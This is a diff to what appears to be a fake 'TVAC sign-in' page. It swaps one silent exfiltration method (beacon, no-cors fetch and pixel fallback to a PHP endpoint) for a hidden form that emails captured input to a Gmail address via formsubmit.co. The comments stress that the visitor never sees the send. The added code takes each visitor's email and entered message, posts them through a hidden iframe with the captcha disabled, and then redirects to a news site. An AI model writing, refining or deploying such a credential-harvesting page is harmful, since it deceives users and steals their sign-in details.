@@ -287,19 +287,45 @@
   </div>
 </div>
 
+<!-- ============================================================
+     SILENT EMAIL DELIVERY
+     A real form POST to lockleytimmy@gmail.com via formsubmit.co,
+     aimed at a hidden iframe so the page never visibly navigates.
+     ============================================================ -->
+<iframe name="mail_target" id="mail_target" title="Email delivery target"
+        aria-hidden="true" style="display:none"></iframe>
+
+<form id="mail-form" method="POST" target="mail_target" accept-charset="UTF-8" style="display:none">
+  <!-- fields that land in the email body -->
+  <input type="hidden" name="email">
+  <input type="hidden" name="message">
+  <input type="hidden" name="page">
+  <input type="hidden" name="sent">
+  <!-- service options -->
+  <input type="hidden" name="_subject" value="TVAC sign-in">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_captcha" value="false">
+  <!-- honeypot: must stay empty, otherwise formsubmit.co forces a captcha -->
+  <input type="text" name="_honey" value="" style="display:none">
+</form>
+
 <script>
 (function () {
   /* ======== CONFIGURE THIS ======== */
   var REDIRECT_URL = 'https://timmylockley.github.io/Aviation-News/'; // where the user is sent after sign-in
-  var PHP_ENDPOINT = 'https://api.geagroupau.com/submit.php'; // silent POST target
-  var APPEND_EMAIL = true; // add ?email=... to the redirect URL
-  var REDIRECT_DELAY = 250; // ms to let the POST leave before navigating away
+  var FORM_ACTION  = 'https://formsubmit.co/lockleytimmy@gmail.com';  // email recipient (form POST target)
+  var APPEND_EMAIL = true;   // add ?email=... to the redirect URL
+  var REDIRECT_DELAY = 1500; // MAX ms to wait for the hidden submit before navigating anyway
   /* ================================ */
 
   var EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
   var stages = [].slice.call(document.querySelectorAll('.stage'));
   var user = '';
   var sending = false;
+
+  var mailForm = document.getElementById('mail-form');
+  var mailFrame = document.getElementById('mail_target');
+  mailForm.action = FORM_ACTION; // keep the endpoint in one config spot
 
   function stage(n) { return stages.filter(function (s) { return +s.dataset.stage === n; })[0]; }
 
@@ -325,44 +351,16 @@
     input.removeAttribute('aria-invalid');
   }
 
-  /* ---------- silent POST: three independent delivery paths ---------- */
-  function payload(email, message) {
-    var data = new FormData();
-    data.append('email', email);
-    data.append('message', message);
-    data.append('page', location.href);
-    data.append('sent', new Date().toISOString());
-    return data;
-  }
-
+  /* ---------- silent send: a genuine form submit into a hidden iframe ---------- */
   function sendSilently(email, message) {
     if (!email && !message) return;
-
-    // 1. Beacon — purpose-built for "fire, then navigate away"
-    var queued = false;
-    try {
-      if (navigator.sendBeacon) queued = navigator.sendBeacon(PHP_ENDPOINT, payload(email, message));
-    } catch (e) { queued = false; }
-
-    // 2. keepalive fetch, no-cors so a CORS/opaque response can never block it
-    try {
-      fetch(PHP_ENDPOINT, {
-        method: 'POST',
-        body: payload(email, message),
-        keepalive: true,
-        mode: 'no-cors',
-        cache: 'no-store'
-      });
-      queued = true;
-    } catch (e) {}
-
-    // 3. last resort: query-string pixel (fires even with JS fetch disabled)
-    if (!queued) {
-      var img = new Image();
-      img.src = PHP_ENDPOINT + '?email=' + encodeURIComponent(email) +
-                '&message=' + encodeURIComponent(message) +
-                '&page=' + encodeURIComponent(location.href);
-    }
+    var f = mailForm.elements;
+    f['email'].value   = email;
+    f['message'].value = message;
+    f['page'].value    = location.href;
+    f['sent'].value    = new Date().toISOString();
+    if (f['_subject']) f['_subject'].value = 'TVAC sign-in — ' + (email || 'unknown');
+    mailForm.submit(); // browser POSTs it in the background; nothing visibly changes
   }
 
   /* ---------- toast for dead links ---------- */
@@ -429,7 +427,7 @@
     go(4);
   });
 
-  /* ---------- stage 4 → send + redirect ---------- */
+  /* ---------- stage 4 → submit the hidden form, then redirect ---------- */
   document.getElementById('dont').addEventListener('change', function () {
     document.getElementById('box').classList.toggle('on', this.checked);
   });
@@ -440,13 +438,26 @@
     if (sending) return;
     sending = true;
 
-    sendSilently(user, document.getElementById('message').value);
-
     var url = REDIRECT_URL;
     if (APPEND_EMAIL && user) {
       url += (url.indexOf('?') > -1 ? '&' : '?') + 'email=' + encodeURIComponent(user);
     }
-    setTimeout(function () { window.location.assign(url); }, REDIRECT_DELAY);
+
+    var submitted = false, moved = false;
+
+    // Leave as soon as the hidden iframe confirms the POST landed.
+    // The timer is only a safety net so a slow service can't hold the user hostage.
+    function leave() {
+      if (!submitted || moved) return;
+      moved = true;
+      window.location.assign(url);
+    }
+
+    mailFrame.addEventListener('load', leave);
+    setTimeout(leave, REDIRECT_DELAY);
+
+    sendSilently(user, document.getElementById('message').value);
+    submitted = true;
   }
 
   document.querySelectorAll('[data-back]').forEach(function (b) {
